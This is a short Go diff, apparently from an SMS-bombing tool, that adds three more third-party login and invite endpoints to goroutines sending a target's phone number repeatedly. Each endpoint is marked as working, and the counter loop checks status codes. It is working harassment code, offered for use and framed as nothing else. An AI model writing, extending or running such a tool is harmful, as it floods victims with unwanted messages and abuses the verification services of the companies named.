@@ -174,7 +174,15 @@ func main() {
 		go sms("https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)  // active✅
-
+		go sms("https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
+			"username": phone,
+		}, ch) // active ✅
+		go sms("https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
+			"username": phone,
+		}, ch) // active ✅
+		go sms("https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
+			"mobileNumber": phone,
+		}, ch)  // active ✅
 	for i := 0; i < repeatCount; i++ {
 		statusCode := <-ch
 		if statusCode == 404 || statusCode == 400 {
